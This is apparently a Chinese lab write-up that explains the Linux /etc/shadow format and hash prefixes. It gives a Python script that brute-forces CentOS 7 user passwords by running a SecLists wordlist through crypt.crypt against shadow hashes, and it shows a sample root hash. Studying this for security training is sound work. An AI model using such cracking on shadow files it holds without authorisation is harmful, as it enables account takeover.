## 实验说明

> 实验环境

- kali Linux
- python3

> 实验目标

编写脚本完成对CentOS_7下的用户密码爆破



## 相关知识

### shadow用户密码文件

![image-20240324184301773](https://typora-picgo-push.oss-cn-hangzhou.aliyuncs.com/img-for-typora/image-20240324184301773.png)

每一行记录一个用户的密码信息，以`:`作为分隔符，一共9段内容；

```txt
root:$6$NS.LfAkXDntETSNh$W0ax51eUwwQ.9f/UoRKB1KEHoyofFvdgu4srTH3lhQk6mjuz9pLaC.1RgLiqcl1BDgYcUklmQjU84eCbUzXNa0::0:99999:7:::
用户名：密码密文：密码修改时间戳：密码最短有效期：密码最长有效期:密码过期时间:密码不活跃期:账户失效期:未分配功能
```



### Linux密码加密

在Linux中，存储在 shadow文件中的用户密码并不是明文形式存储的，而是经过单向加密处理的哈希值。这意味着即使得到了这个密码哈希值，也很难通过逆向计算得到原始密码，因为哈希函数通常是不可逆的。当用户登录时，系统会将输入的密码经过相同的哈希算法处理，然后与存储的哈希值进行比对，以验证密码是否正确。在这个实验中，密码哈希值以 `$6$` 开头，这代表了使用的是 SHA-512 算法进行加密。

- `$1$`：MD5
- `$2$`：Blowfish
- `$5$`：SHA-256
- `$6$`：SHA-512



### crypt函数

`crypt.crypt` 函数是 Python 标准库中的一部分，用于生成加密后的密码哈希值。在 Unix 和 Linux 系统中，一般会使用 C 库中的 `crypt()` 函数来进行密码加密。Python 的 `crypt.crypt` 函数实际上是对这个 C 函数的 Python 接口进行了封装。

因此，虽然 `crypt.crypt` 函数是由 Python 提供的，但其实现和功能与 Linux 系统中的 `crypt()` 函数紧密相关。在 Linux 系统上，Python 的 `crypt.crypt` 函数通常会利用系统提供的密码加密功能来生成密码哈希值。

通常情况下，在 Python 中使用 `crypt.crypt` 函数生成的哈希值以 `$6$` 开头。这是因为在大多数现代 Unix/Linux 系统中，默认情况下 `crypt.crypt` 函数使用 SHA-512 算法进行加密。由于 SHA-512 算法被认为更安全，因此成为了默认选择。



## 实验过程

> 1.准备好 shadow密码文件和密码字典

- shadow文件在linux系统的`/etc`目录下；
- 密码字典可以去SecList库下载； SecList是一个安全研究者和渗透测试人员常用的资源库，其中收集了一个 "Passwords" 目录，包含着许多大型的字典文件，包括弱口令字典。官网地址：https://github.com/danielmiessler/SecLists/tree/master/Passwords

> 2.编写脚本

```py
import crypt

#准备文件
shadow_path="/home/kali/shadow"
pwd_path="/home/kali/darkweb2017-top100.txt"

shadow_table=[]
#切片分离处shadow中有密码的用户名和密码
with open(file=shadow_path,mode="r") as f:
    for line in f:
        pwd_table=line.split(':')
        if (len(pwd_table[1])>3):
            shadow_table.append(pwd_table[0]+":"+pwd_table[1])

#对照密码字典进行爆破
with open(file=pwd_path,mode="r") as f:
    #分离用户名和密码盐值
    for entry in shadow_table:
             user=entry.split(':')[0]
             tmp=entry.split(':')[1]
             pwd_cipher=tmp[0:tmp.rfind("$")]
            #遍历密码字典加密判断
             for line in f:
                   pwd_line=line.strip()
                   print(f"\r[-] {user} Tring password {pwd_line}",end=" ")
                   if crypt.crypt(pwd_line,pwd_cipher)==tmp:
                        print(f"\r\n[+] OK! user={user},password={pwd_line}")
                        break              
```

> 3.程序运行结果

![image-20240324215603081](https://typora-picgo-push.oss-cn-hangzhou.aliyuncs.com/img-for-typora/image-20240324215603081.png)





